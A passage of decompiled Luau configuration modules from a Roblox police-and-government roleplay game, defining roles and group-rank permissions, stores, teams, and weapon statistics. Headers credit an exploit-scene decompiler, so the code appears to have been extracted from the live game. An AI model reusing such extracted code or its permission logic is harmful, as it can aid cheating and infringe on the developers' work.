	Priority = 1
};
v1.PoliceBarrier = {
	Name = "Police Barrier", 
	PlayerLimit = 20, 
	Asset = l__Ploppables__2.PoliceBarrier, 
	Priority = 3
};
v1.NGBarrier = {
	Name = "NG Barrier", 
	PlayerLimit = 20, 
	Asset = l__Ploppables__2.NGBarrier, 
	Priority = 2
};
v1.PWBarrier = {
	Name = "Parks Barrier", 
	PlayerLimit = 20, 
	Asset = l__Ploppables__2.PWBarrier, 
	Priority = 1
};
return v1;

database.roles

-- Decompiled with the Synapse X Luau decompiler.

local v1 = require(script.Parent.Teams);
local v2 = { 1, 2, 4, 5, 6, 7, 8, 9, 12, 14, 16, 17, };
local v3 = {
	Inmate = {
		AbsoluteIncome = true, 
		Income = 2, 
		TeamCriteria = { 5 },
		Name = "Inmate"
	}, 
	LETI = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 7 }
		},
		Name = "LETI"
	}, 
	ED = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanSpawnVehicle = { "Hankmobile" }
		},
		Name = "ED"
	}, 
	SS = {
		GroupCriteria = { { 5778965, 125 } }, 
		Permissions = {
			CanSpawnVehicle = { "DevConveyor" }
		},
		Name = "SS"
	}, 
	PEPT = {
		Permissions = {
			CanSpawnVehicle = { "Hankmobile" }
		},
		Name = "PEPT"
	}, 
	LawEnforcement = {
		GroupCriteria = { { 4637939 }, { 3632587 }, { 9442050 }, { 9442043 }, { 9442023 }, { 9442116 }
		},
		Name = "LawEnforcement"
	},
	NHTAGroup = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 16 }
		},
		Name = "NHTAGroup"
	}, 
	NHTATeam = {
		Income = 80, 
		GroupCriteria = { { 5778965 } }, 
		TeamCriteria = { 16 }, 
		Permissions = {
			CanGetItems = { "Flashlight", "Cone", "Radio" }, 
			CanChangeTeam = { 16 }, 
			CanSpawnVehicle = { "NHTALandCrawlerTD","NHTALandCrawlerDD","NHTALandCrawler", "NHTAUtility" }, 
			CanUseChannel = { "NHTA", "Global" }
		},
		Name = "NHTATeam"
	}, 
	PBSGroup = {
		GroupCriteria = { { 9441992 } }, 
		Permissions = {
			CanChangeTeam = { 17 }
		},
		Name = "PBSGroup"
	}, 
	PBSTeam = {
		Income = 80, 
		GroupCriteria = { { 9441992 } }, 
		TeamCriteria = { 17 }, 
		Permissions = {
			CanChangeTeam = { 17 }, 
			CanSpawnVehicle = { "PBSConveyor" }
		},
		Name = "PBSTeam"
	}, 
	MNGGroup = {
		GroupCriteria = {
			{33613424}, -- First group
			{5778965}   -- Second group
		},
		Permissions = {
			CanChangeTeam = { 15 }
		},
		Name = "MNGGroup"
	}, 
	MNGTeam = {
		Income = 80, 
		GroupCriteria = {
			{33613424}, -- First group
			{5778965}   -- Second group
		},
		TeamCriteria = { 15 }, 
		Permissions = {
			CanGetItems = { "Flashlight", "Radio", "Baton" }, 
			CanChangeTeam = { 15 }, 
			CanExemptKarma = true, 
			CanUseChannel = { "MNG", "ES1", "Global" }
		},
		Name = "MNGTeam"
	}, 
	MNGTrained = {
		Income = 80, 
		GroupCriteria = {
			{33613424}, -- First group
			{5778965}   -- Second group
		},
		TeamCriteria = { 15 }, 
		Permissions = {
			CanGetItems = { "Benn17", "DelinoR21M", "Mag556", "MagB17", "Cone", "NGBarrier", "HandcuffSet" }, 
			CanSpawnVehicle = { "NGElDorado4x4", "NGCrusaderC", "NGCrusader", "NGUtility"  }, 
			CanCuff = true
		},
		Name = "MNGTrained"

	}, 
	MNGMid = {
		Income = 85, 
		TeamCriteria = { 15 }, 
		GroupCriteria = { { 5778965, 75 } 
		}, 
		Name = "MNGMid"
	},

	MNGHigh = {
		Income = 87, 
		TeamCriteria = { 15 }, 
		GroupCriteria = { { 5778965, 165 } },
		Name = "MNGHigh"
	}, 
	MNGMP = {
		Income = 87, 
		GroupCriteria = { { 5778965, 144, true }, { 5778965, 20, true } }, 
		TeamCriteria = { 15 }, 
		Permissions = {
			CanSpawnVehicle = { "NGCrusaderCMP", "NGCrusaderMP", "UnmarkedCrusaderC", "UnmarkedCrusader" }, 
			CanGetItems = { "MagCart", "TI26" }, 
			CanUseChannel = { "LE1", "LE2", "ES1" }, 
			CanInteractTeams = { 1, 2, 4, 5, 6, 7, 8, 9, 12, 14, 15, 16, 17 }, 
			CanArrest = true, 
			CanSearch = true,
			CanFine  = true
		},
		Name = "MNGMP"
	},
	PWGroup = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 14 }
		},
		Name = "PWGroup"
	}, 

	Beloved = {
		DataCriteria = { "Beloved" },
		Permissions = {
			CanGetItems = { "Delino1711", "Mag45" }, 
		},
		Name = "Beloved"
	},
	PWTeam = {
		Income = 80, 
		GroupCriteria = { { 5778965 } }, 
		TeamCriteria = { 14 }, 
		Permissions = {
			CanGetItems = { "Flashlight", "Radio" }, 
			CanChangeTeam = { 14 }, 
			CanUseChannel = { "PW", "ES1", "Global" }, 
			CanExemptKarma = true, 
			CanSpawnVehicle = { "PWIntrepid" }
		},
		Name = "PWTeam"
	}, 
	PWLowerMid = {
		GroupCriteria = { { 5778965, 43 } }, 
		TeamCriteria = { 14 }, 
		Permissions = {
			CanGetItems = { "Baton" }
		},
		Name = "PWLowerMid"
	}, 
	PWMid = {
		Income = 85, 
		GroupCriteria = { { 5778965, 86 } }, 
		TeamCriteria = { 14 }, 
		Permissions = {
			CanGetItems = { "Hawth500", "Mag12G", "Cone", "PWBarrier" }
		},
		Name = "PWMid"

	}, 
	--PWLEO = {
	--	Income = 85, 
	--	GroupCriteria = { { 9442116, 8 } }, 
	--	TeamCriteria = { 14 }, 
	--	Permissions = {
	--		CanGetItems = { "Benn17", "MagB17", "MagCart", "TI26", "HandcuffSet" },
	--		CanSpawnVehicle = { "PWIntrepidLEO","PWJackalLEO" },
	--		CanInteractTeams = v2, 
	--		CanArrest = true, 
	--		CanCuff = true, 
	--		CanSearch = true,
	--		CanFine  = true,
	--	},
	--	Name = "PWLEO"

	--},
	PWHigh = {
		Income = 88, 
		GroupCriteria = { { 5778965, 172 } }, 
		TeamCriteria = { 14 }, 
		Permissions = {
			CanSpawnVehicle = { "PWJackal" }
		},
		Name = "PWHigh"
	}, 
	SheriffGroup = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 1 }
		},
		Name = "SheriffGroup"
	}, 
	SheriffTeam = {
		Income = 80, 
		GroupCriteria = { { 5778965 } }, 
		TeamCriteria = { 2 }, 
		Permissions = {
			CanChangeTeam = { 1 }, 
			CanUseChannel = { "NHCSO", "LE1", "LE2", "ES1", "Global" }, 
			CanGetItems = { "Flashlight", "Baton", "Radio", "HandcuffSet", "RadarGun" }, 
			CanInteractTeams = v2, 
			CanSearch = true, 
			CanCuff = true, 
			CanExemptKarma = true, 
			CanSpawnVehicle = { "SheriffConveyor" }
		},
		Name = "SheriffTeam"
	}, 
	SheriffLEO = {
		GroupCriteria = { { 5778965, 10 } }, 
		TeamCriteria = { 3 }, 
		Permissions = {
			CanChangeTeam = { 1 }, 
			CanGetItems = { "Hawth500", "Benn17", "TI26", "DelinoR21A", "Cone", "PoliceBarrier", "Mag12G", "Mag556", "MagCart", "MagB17" }, 
			CanArrest = true, 
			CanFine = true, 
			CanSpawnVehicle = {"SheriffCrusaderS","SheriffChariotSup","SheriffChariot", "SheriffCrusaderC", "SheriffJackal", "SheriffCrusaderCS", "UnmarkedCrusaderC", "UnmarkedCrusader", "SheriffCrusader", "SheriffUtility" }
		},
		Name = "SheriffLEO"
	}, 
	SheriffMid = {
		Income = 85, 
		GroupCriteria = { { 5778965, 220 } }, 
		TeamCriteria = { 3 }, 
		Permissions = {
			CanSpawnVehicle = { "UnmarkedJackalS","UnmarkedTaxiJackal","SheriffChariotSup"}, 
			CanRevokeLicense = true
		},
		Name = "SheriffMid"
	}, 
	SheriffHigh = {
		Income = 88, 
		GroupCriteria = { { 5778965, 221 } }, 
		TeamCriteria = { 3 }, 
		Permissions = {
			CanInteractTeams = { 3 }
		},
		Name = "SheriffHigh"
	}, 

	MSPGroup = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 1 }
		},
		Name = "MSPGroup"
	}, 
	MSPTeam = {
		Income = 80, 
		GroupCriteria = { { 5778965 } }, 
		TeamCriteria = { 11 }, 
		Permissions = {
			CanChangeTeam = { 1 }, 
			CanUseChannel = { "MSP", "LE1", "LE2", "ES1", "Global" }, 
			CanGetItems = { "Hawth500", "Benn17", "TI26", "Flashlight", "Baton", "Radio", "DelinoR21A", "Cone", "PoliceBarrier", "HandcuffSet", "Mag12G", "Mag556", "MagCart", "MagB17", "RadarGun" }, 
			CanInteractTeams = v2, 
			CanCuff = true, 
			CanArrest = true, 
			CanSearch = true, 
			CanExemptKarma = true, 
			CanFine = true, 
			CanSpawnVehicle = { "MSPChariot","MSPJackal", "UnmarkedJackal", "MSPCrusaderC", "MSPCrusaderCS", "UnmarkedCrusaderC", "MSPCrusader", "MSPCrusaderS", "UnmarkedCrusader", "MSPUtility" }
		},
		Name = "MSPTeam"
	}, 
	MSPMid = {
		Income = 85, 
		GroupCriteria = { { 5778965, 125 } }, 
		TeamCriteria = { 11 }, 
		Permissions = {
			CanRevokeLicense = true
		},
		Name = "MSPMid"
	}, 
	MSPHigh = {
		Income = 88, 
		GroupCriteria = { { 5778965, 254 } }, 
		TeamCriteria = { 11 }, 
		Permissions = {
			CanInteractTeams = { 11 }
		},
		Name = "MSPHigh"
	}, 
	LPDGroup = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 1 }
		},
		Name = "LPDGroup"
	}, 
	LPDTeam = {
		Income = 80, 
		GroupCriteria = { { 5778965 } }, 
		TeamCriteria = { 13 }, 
		Permissions = {
			CanChangeTeam = { 1 }, 
			CanUseChannel = { "LPD", "LE1", "LE2", "ES1", "Global" }, 
			CanGetItems = { "Hawth500", "Benn17", "TI26", "Flashlight", "Baton", "Radio", "DelinoR21A", "Cone", "PoliceBarrier", "HandcuffSet", "Mag12G", "Mag556", "MagCart", "MagB17", "RadarGun" }, 
			CanInteractTeams = v2, 
			CanCuff = true, 
			CanArrest = true, 
			CanExemptKarma = true, 
			CanSearch = true, 
			CanFine = true, 
			CanSpawnVehicle = { "LPDCrusaderS","LPDJackal", "UnmarkedCrusaderC", "LPDCrusaderC", "LPDCrusaderCS", "UnmarkedCrusader", "LPDCrusader", "LPDUtility" }
		},
		Name = "LPDTeam"
	}, 
	LPDMid = {
		Income = 85, 
		GroupCriteria = { { 5778965, 130 } }, 
		TeamCriteria = { 13 }, 
		Permissions = {
			CanRevokeLicense = true
		},
		Name = "LPDMid"
	}, 
	LPDHigh = {
		Income = 88, 
		GroupCriteria = { { 5778965, 254 } }, 
		TeamCriteria = { 13 }, 
		Permissions = {
			CanInteractTeams = { 13 }
		},
		Name = "LPDHigh"

	}, 
	PPDGroup = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 10 }
		},
		Name = "PPDGroup"
	}, 
	PPDTeam = {
		Income = 80, 
		GroupCriteria = { { 5778965 } }, 
		TeamCriteria = { 10 }, 
		Permissions = {
			CanChangeTeam = { 10 }, 
			CanUseChannel = { "PPD", "LE1", "LE2", "ES1", "Global" }, 
			CanGetItems = { "Hawth500", "Benn17", "TI26", "Flashlight", "Baton", "Radio", "DelinoR21A", "Cone", "PoliceBarrier", "HandcuffSet", "Mag12G", "Mag556", "MagCart", "MagB17", "RadarGun" }, 
			CanInteractTeams = v2, 
			CanCuff = true, 
			CanArrest = true, 
			CanSearch = true, 
			CanExemptKarma = true, 
			CanFine = true, 
			CanSpawnVehicle = { "PPDConveyor","PPDCrusaderCS","PPDCrusaderS","PPDElDoradoSup","PPDElDorado", "PPDJackal", "UnmarkedCrusaderC", "PPDCrusaderC", "PPDCrusader", "UnmarkedCrusader" }
		},
		Name = "PPDTeam"
	}, 
	PPDMid = {
		Income = 85, 
		GroupCriteria = { { 5778965, 40 } }, 
		TeamCriteria = { 10 }, 
		Permissions = {
			CanSpawnVehicle = {  "PPDElDoradoSup" }, 
			CanRevokeLicense = true
		},
		Name = "PPDMid"
	}, 
	PPDHigh = {
		Income = 88, 
		GroupCriteria = { { 5778965, 80 } }, 
		TeamCriteria = { 10 }, 
		Permissions = {
			CanInteractTeams = { 10 }
		},
		Name = "PPDHigh"
	}, 
	FireDepGroup = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 4 }
		},
		Name = "FireDepGroup"

	}, 
	FireDepTeam = {
		Income = 80, 
		GroupCriteria = { { 5778965 } }, 
		TeamCriteria = { 4 }, 
		Permissions = {
			CanChangeTeam = { 4 }, 
			CanUseChannel = { "Fire Department", "ES1", "Global" }, 
			CanGetItems = { "Radio", "Flashlight", "Cone", "FireBarrier" }, 
			CanSpawnVehicle = { "FireBoxAmbulance", "FireAmbulance", "FireElDorado", "FireTruck", "UnmarkedCrusader" }
		},
		Name = "FireDepTeam"
	}, 
	FireDepMid = {
		Income = 85, 
		GroupCriteria = { { 5778965, 78 } }, 
		TeamCriteria = { 4 

		},
		Name = "FireDepMid"

	}, 
	FireDepHigh = {
		Income = 88, 
		GroupCriteria = { { 5778965, 156 } }, 
		TeamCriteria = { 4 

		},
		Name = "FireDepHigh"
	}, 
	FireDepTop = {
		GroupCriteria = { { 5778965, 208, true } }, 
		TeamCriteria = { 4 

		},
		Name = "FireDepTop"
	}, 
	StateGovGroup = {
		GroupCriteria = { { 5778965, 28 } },
		Permissions = {
			CanChangeTeam = { 6 }
		},
		Name = "StateGovGroup"
	}, 
	StateGovTeam = {
		Income = 88, 
		GroupCriteria = { { 5778965, 28 } },
		TeamCriteria = { 6 }, 
		Permissions = {
			CanChangeTeam = { 6 }

		},
		Name = "StateGovTeam"
	}, 
	StateGovMid = {
		Income = 92, 
		GroupCriteria = { { 5778965, 35 } }, 
		TeamCriteria = { 6 

		},
		Name = "StateGovMid"
	}, 
	StateGovHigh = {
		Income = 95, 
		GroupCriteria = { { 5778965, 49 } }, 
		TeamCriteria = { 6 }, 
		Permissions = {
			CanGetItems = { "Gavel" }
		},
		Name = "StateGovHigh"
	}, 
	CountyGovGroup = {
		GroupCriteria = { { 5778965, 26 } }, 
		Permissions = {
			CanChangeTeam = { 8 }
		},
		Name = "CountyGovGroup"
	}, 
	CountyGovTeam = {
		Income = 85, 
		GroupCriteria = { { 5778965, 26 } }, 
		TeamCriteria = { 8 }, 
		Permissions = {
			CanChangeTeam = { 8 }
		},
		Name = "CountyGovTeam"
	}, 
	CountyGovMid = {
		Income = 89, 
		GroupCriteria = { { 5778965, 28 } }, 
		TeamCriteria = { 8 

		},
		Name = "CountyGovMid"
	}, 
	CountyGovHigh = {
		Income = 92, 
		GroupCriteria = { { 5778965, 30 } }, 
		TeamCriteria = { 8 

		},
		Name = "CountyGovHigh"
	}, 
	JudiciaryGroup = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 9 }
		},
		Name = "JudiciaryGroup"
	}, 
	JudiciaryTeam = {
		Income = 88, 
		GroupCriteria = { { 5778965 } }, 
		TeamCriteria = { 9 }, 
		Permissions = {
			CanChangeTeam = { 2 }
		},
		Name = "JudiciaryTeam"
	}, 
	JudiciaryMid = {
		Income = 92, 
		GroupCriteria = { { 5778965, 3 } }, 
		TeamCriteria = { 9 }, 
		Permissions = {
			CanExpunge = true, 
			CanRevokeLicense = true, 
			CanIssueWarrant = true, 
			CanRule = true, 
			CanGetItems = { "Gavel" }
		},
		Name = "JudiciaryMid"
	}, 
	JudicaryHigh = {
		Income = 95, 
		GroupCriteria = { { 5778965, 4 } }, 
		TeamCriteria = { 9 

		},
		Name = "JudicaryHigh"
	}, 
	JudiciaryDistrict = {
		GroupCriteria = { { 5778965, 5, true }, { 5778965, 6, true } }, 
		TeamCriteria = { 9 }, 
		Permissions = {
			CanSentence = true
		},
		Name = "JudiciaryDistrict"
	}, 
	JudiciaryJustice = {
		GroupCriteria = { { 5778965, 192 } }, 
		TeamCriteria = { 9 }, 
		Permissions = {
			CanSentence = true
		},
		Name = "JudiciaryJustice"
	}, 
	JusticeGroup = {
		GroupCriteria = { { 5778965 } }, 
		Permissions = {
			CanChangeTeam = { 12 }
		},
		Name = "JusticeGroup"
	}, 
	JusticeTeam = {
		GroupCriteria = { { 5778965 } }, 
		TeamCriteria = { 12 }, 
		Permissions = {
			CanChangeTeam = { 12 }
		},
		Name = "JusticeTeam"
	}, 
	JusticeMid = {
		Income = 88, 
		GroupCriteria = { { 5778965, 72 } }, 
		TeamCriteria = { 12 

		},
		Name = "JusticeMid"
	}, 
	JusticeHigh = {
		Income = 93, 
		GroupCriteria = { { 5778965, 144 } }, 
		TeamCriteria = { 12 

		},
		Name = "JusticeHigh"
	}, 
	WeaponLicenseHolder = {
		DataCriteria = { "WeaponLicense" }, 
		Permissions = {
			CanPurchaseLegal = true
		},
		Name = "WeaponLicenseHolder"
	}, 
	Admin = {
		DataCriteria = { "Admin" 

		},
		Name = "Admin"
	}, 
	Developer = {
		DataCriteria = { "Developer" 

		},
		Name = "Developer"
	},
	Moderator = {
		Income = 90, 
		DataCriteria = { "Moderator" 

		},
		Name = "Moderator"
	}, 
	Carpathian = {
		GroupCriteria = { { 9458202 } }, 
		Permissions = {
			CanSpawnVehicle = { "McDoogleCrusader", "McDoogleCart" }
		},
		Name = "Carpathian"
	}, 

	VoltStaff = {
		GroupCriteria = { { 9458223, 96 } 
		},
		Name = "VoltStaff"
	}, 
	VoltSupervisor = {
		GroupCriteria = { { 9458223, 160 } 
		},
		Name = "VoltSupervisor"
	}, 
	CivilDefense = {
		GroupCriteria = { { 9458236 }
		},
		Name = "CivilDefense"
	}, 
	ICFGroup = {
		Income = 85, 
		GroupCriteria = { { 10980802, 75, true }, { 10980802, 82, true } 
		},
		Name = "ICFGroup"
	}, 

	--ASPSGroup = {
	--	GroupCriteria = { { 9970249 } }, 
	--	Permissions = {
	--		CanUseChannel = { "ASPS" }, 
	--		CanSpawnVehicle = { "ASPSCrusaderC" },
	--		CanGetItems = { "Mag556", "DelinoR21ASPS", "RadioASPS", "Flashlight" }
	--	},
	--	Name = "ASPSGroup"
	--}, 

	--ASPSUntrained = {
	--	GroupCriteria = { { 9970249, 2 } },
	--	Permissions = {
	--		CanUseChannel = { "ASPS" }, 
	--		CanSpawnVehicle = { "ASPSCrusaderC" },
	--		CanGetItems = { "RadioASPS", "Flashlight" }
	--	},
	--	Name = "ASPSTrained"
	--}, 
	--ASPSMid = {
	--	GroupCriteria = { { 9970249, 4 } }, 
	--	Permissions = {
	--		CanSpawnVehicle = { "ASPSCrusaderCS" },
	--	},
	--	Name = "ASPSMid"
	--}, 
	--AFIGroup = {
	--	GroupCriteria = { { 6362085 } }, 
	--	Permissions = {
	--		CanSpawnVehicle = { "AFIElDorado4x4" },
	--		CanUseChannel = { "AFI" }, 
	--		CanGetItems = { "AFIRadio" }, 
	--	},
	--	Name = "AFIGroup"
	--}, 
	Tourist = {
		Income = 55, 
		Permissions = {
			CanChangeTeam = { 1 }
		},
		Name = "Tourist"
	}, 
	Citizen = {
		Income = 60, 
		GroupCriteria = { { 10980802, 2 } }, 
		Permissions = {
			CanChangeTeam = { 2 }, 
			CanTransfer = true
		},
		Name = "Citizen"
	}
};
return v3;

database.stores
-- Script GUID: {F92CA9C6-FE37-4992-80FD-0F7805BE9B6A}
-- Decompiled with the Synapse X Luau decompiler.

local v1 = {
	Freedom = {
		Name = "Freedom Firearms", 
		Accepts = 3, 
		Items = { 
			{ "DelinoSpec", 40, true },
			{ "DelinoDef", 30, true },
			{ "Delino1711", 130, true }, 
			{ "Mag45", 5, true },
			{ "Mag44", 4, true },
			{ "BaseballBat", 13, false },
			{ "Switchblade", 10, false } }
	}, 
	Gills = {
		Name = "Gill's Guns", 
		Accepts = 3, 
		Items = { 
			{ "DelinoSpec", 40, true },
			{ "DelinoDef", 30, true },
			{ "Hawth500C", 67, true },
			{ "DelinoR21", 80, true },
			{ "Delino1711", 120, true },
			{ "Mag45", 5, true },
			{ "Mag12G", 5, true },
			{ "Mag44", 3, true }, 
			{ "Mag556", 5, true },
			{ "BaseballBat", 12, false },
			{ "Switchblade", 8, false } }
	}, 
	Parks = {
		Name = "Parks & Wildlife", 
		Accepts = 3, 
		Items = {
			{ "DelinoSpec", 40, true },
			{ "DelinoDef", 30, true },
			{ "Hawth500C", 77, true }, 
			{ "DelinoR21", 90, true }, 
			{ "Delino1711", 110, true },
			{ "Mag45", 5, true },
			{ "Mag12G", 5, true },
			{ "Mag44", 3, true },
			{ "Mag556", 5, true },
			{ "BaseballBat", 12, false },
			{ "Switchblade", 8, false } }
	}, 
	Cube = {
		Name = "Cube Mart Sporting Goods", 
		Accepts = 3, 
		Items = { 
			{ "Hawth500C", 70, true },
			{ "DelinoR21", 85, true },
			{ "Mag12G", 15, true },
			{ "Mag44", 35, true },
			{ "Mag556", 5, true }, 
			{ "BaseballBat", 14, false },
			{ "Switchblade", 9, false } }
	}, 
	LanderSewers = {
		Name = "LPD Retirement Fund", 
		Accepts = 3, 
		Items = { 
			{ "DelinoSpec", 54, false },
			{ "DelinoDef", 47, false },
			{ "Delino1711", 150, false },
			{ "Mag45", 5, false },
			{ "Hawth500C", 90, false }, 
			{ "DelinoR21", 125, false }, 
			{ "Benn17C", 175, false },
			{ "DelinoR21AC", 185, false }, 
			{ "Mag12G", 9, false },
			{ "Mag44", 7, false },
			{ "Mag55610", 9, false },
			{ "MagB17", 15, false },
			{ "Mag556", 13, false },
			{ "Flashlight", 2, false } }
	}, 
	PlymouthSewers = {
		Name = "PPD Retirement Fund", 
		Accepts = 3, 
		Items = { 
			{ "DelinoSpec", 54, false },
			{ "DelinoDef", 47, false },
			{ "Delino1711", 150, false },
			{ "Mag45", 5, false },
			{ "Hawth500C", 90, false }, 
			{ "DelinoR21", 125, false }, 
			{ "Benn17C", 175, false },
			{ "DelinoR21AC", 185, false }, 
			{ "Mag12G", 9, false },
			{ "Mag44", 7, false },
			{ "Mag55610", 9, false },
			{ "MagB17", 15, false },
			{ "Mag556", 13, false },
			{ "Flashlight", 2, false } }
	}, 
	GasStation = {
		Name = "Gas Station", 
		Accepts = 3, 
		Items = { 
			{ "Jerrycan", 5, false }, 
			{ "Flashlight", 3, false },
			{"ProtestSign", 6, false} }
	}
};
return v1;

database.teams

-- Decompiled with the Synapse X Luau decompiler.

local v1 = { {
	
	Name = "Tourist", 
	TeamColor = BrickColor.new("Olive"), 
	Default = true, 
	Priority = 2
}, {
	
	Name = "Citizen", 
	TeamColor = BrickColor.new("Bright blue"), 
	Priority = 1
}, {
	--1
	Name = "Sheriff's Office", 
	TeamColor = BrickColor.new("Brown"), 
	DefaultChannel = "Global", 
	Uniform = { "SheriffTeam", "Class A", "No Vest" }
}, {
	--2
	Name = "Fire Department", 
	TeamColor = BrickColor.new("Bright red"), 
	DefaultChannel = "Global", 
	Uniform = { "FireDepTeam", "Station Dress" }
}, {
	--3
	Name = "Incarcerated", 
	TeamColor = BrickColor.new("Bright orange"), 
	Uniform = { "Inmate", "Inmate Clothes" }, 
	Jail = true
}, {
	--4
	Name = "State Government", 
	TeamColor = BrickColor.new("Slime green")
}, {
	--5
	Name = "LETI", 
	TeamColor = BrickColor.new("Storm blue"), 
	DefaultChannel = "Global", 
	Uniform = { "LETI", "LETI Uniform" }
}, {
	--6
	Name = "County Government", 
	TeamColor = BrickColor.new("Mint")
}, {
	--7
	Name = "Courts", 
	TeamColor = BrickColor.new("Plum"), 
	RoleSpawns = { { "JudiciaryJustice", "SupremeJudiciary" } }
}, {
	--8
	Name = "U.S. Verdelac", 
	TeamColor = BrickColor.new("Steel blue"), 
	DefaultChannel = "Global", 
	Uniform = { "PPDTeam", "Class A", "No Vest" }
}, {
	--9
	Name = "Discarded State Police", 
	TeamColor = BrickColor.new("Navy blue"), 
	DefaultChannel = "Global", 
	Uniform = { "MSPTeam", "Class A", "No Vest" }
}, {
	--10
	Name = "Department of Justice", 
	TeamColor = BrickColor.new("Persimmon")
}, {
	--11
	Name = "Lander Police Department", 
	TeamColor = BrickColor.new("Earth blue"), 
	DefaultChannel = "Global", 
	Uniform = { "LPDTeam", "Class A", "No Vest" }
}, {

	--12
	Name = "Discarded Parks & Wildlife", 
	TeamColor = BrickColor.new("Shamrock"), 
	DefaultChannel = "Global", 
	Uniform = { "PWTeam", "Class A" }
}, {
	--13
	Name = "Team 1", 
	TeamColor = BrickColor.new("Crimson"), 
	DefaultChannel = "Global", 
		Uniform = { "MNGTeam", "BDU", "Patrol Cap" }
}, {
	--14
	Name = "Discarded Transit Authority", 
	TeamColor = BrickColor.new("Royal purple"), 
	DefaultChannel = "Global", 
	Uniform = { "NHTATeam", "Bus Operator" }
}, {
	--15
	Name = "Public Broadcasting Service", 
	TeamColor = BrickColor.new("CGA brown")
	
}, {
	--18
	Name = "West Point Police Department", 
	TeamColor = BrickColor.new("Gold"), 
	DefaultChannel = "Global", 
	Uniform = { "WPPDTeam", "Class A", "No Vest" }
		
}, {		
		--20
	Name = "Team 2", 
	TeamColor = BrickColor.new("Forest green"), 
	DefaultChannel = "Global", 
		Uniform = { "MNGTeam", "BDU", "Patrol Cap" }
		
}, {
		--21
	Name = "Team 3", 
	TeamColor = BrickColor.new("Deep blue"), 
	DefaultChannel = "Global", 
	Uniform = { "MNGTeam" , "BDU", "Patrol Cap" }
		
}, {
		--19
	Name = "Team 4", 
	TeamColor = BrickColor.new("Sand blue"), 
	DefaultChannel = "Global", 
	Uniform = { "MNGTeam", "BDU", "Patrol Cap" }
}, }


if game.PlaceId == 5561650167 then
	print("[Teams] Configuring LETI Instructor teams");
	table.insert(v1, {
		Name = "LETI Instructors", 
		TeamColor = BrickColor.new("Medium blue"), 
		DefaultChannel = "Global", 
		Uniform = { "LETI", "LETI Uniform" }
	});
end;
for v2, v3 in pairs(v1) do
	if v3.RoleSpawns then
		local v4 = {};
		for v5, v6 in ipairs(v3.RoleSpawns) do
			v4[v6[2]] = true;
		end;
		v3.VIPSpawns = v4;
	end;
end;
return v1;

database.tools
-- Decompiled with the Synapse X Luau decompiler.

local v1 = {};
local v2 = {
	["Right Arm"] = { 0.5, 0.7 }, 
	["Left Arm"] = { 0.5, 0.7 }, 
	Torso = { 1, 1 }, 
	Head = { 1, 1.2 }, 
	["Right Leg"] = { 0.4, 0.6 }, 
	["Left Leg"] = { 0.4, 0.6 }
};
v1.Baton = {
	Type = "Melee", 
	Asset = "Baton", 
	BaseDamage = 9, 
	Multipliers = v2,
	Range = 10, 
};
v1.BaseballBat = {
	Type = "Melee", 
	Asset = "BaseballBat", 
	BaseDamage = 10, 
	Range = 10, 
	Multipliers = v2
};
v1.ProtestSign = {
	Type = "Melee", 
	Asset = "ProtestSign", 
	BaseDamage = 5, 
	Range = 9, 
	Multipliers = v2,
	NoSmash = true
};
v1.Switchblade = {
	Type = "Melee", 
	Asset = "Switchblade", 
	BaseDamage = 16, 
	Range = 10, 
	Multipliers = v2, 
	NoSmash = true
};
v1.Snub = {
	Asset = "Snub", 
	BaseDamage = 30, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2, 2.5 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.25, 
	MagSize = 6, 
	Rounds = "9m", 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 4.9
};
v1.Para17 = {
	Asset = "Para17", 
	BaseDamage = 32, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.15, 
	Magazine = true, 
	Rounds = "9mm", 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 2.8,
	Abilities = {
		Flashlight = {
			Type = "toggle", 
			Label = "Flashlight", 
			Function = function(p1, p2)
				local l__Flashlight__3 = p1.Flashlight;
				local v4 = l__Flashlight__3.Material ~= Enum.Material.Neon;
				l__Flashlight__3.Material = v4 and Enum.Material.Neon or Enum.Material.SmoothPlastic;
				l__Flashlight__3.SpotLight.Enabled = v4;
			end, 
			Key = Enum.KeyCode.B, 
			Debounce = 0.2
		}
	}
};
v1.StetsonM1 = {
	Asset = "StetsonM1", 
	BaseDamage = 32, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread =  0.15, 
	Magazine = true, 
	Rounds = "556", 
	Auto = false, 
	Range = 1000, 
	FoV = 60, 
	Type = "Firearm", 
	Recoil = 2.5
};
v1.StetsonM2M = {
	Asset = "StetsonM2M", 
	BaseDamage = 32, 
	Multipliers = {
		["Right Arm"] = { 0.4, 0.6 }, 
		["Left Arm"] = { 0.4, 0.6 }, 
		Torso = { 1, 1 }, 
		Head = { 2.6, 3.4 }, 
		["Right Leg"] = { 0.6, 0.8 }, 
		["Left Leg"] = { 0.6, 0.8 }
	}, 
	Spread = 0.4, 
	Magazine = true, 
	Rounds = "556", 
	Auto = true, 
	Range = 1000, 
	FoV = 25, 
	Type = "Firearm", 
	Recoil = 2.3,
	Abilities = {
